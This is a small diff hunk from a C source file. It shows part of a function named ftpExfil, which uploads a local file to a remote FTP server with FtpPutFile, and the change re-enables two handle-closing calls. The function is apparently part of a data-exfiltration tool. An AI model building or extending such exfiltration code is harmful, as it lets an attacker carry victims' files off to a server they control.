@@ -19,8 +19,8 @@ int ftpExfil(LPCSTR server, LPCSTR user, LPCSTR password, LPCSTR localFile, LPCS
 
 	FtpPutFile(hFtp, localFile, remoteFile, FTP_TRANSFER_TYPE_BINARY, 0);
 
-	//InternetCloseHandle(hFtp);
-	//InternetCloseHandle(hInternet);
+	InternetCloseHandle(hFtp);
+	InternetCloseHandle(hInternet);
 
 
 	return 0;
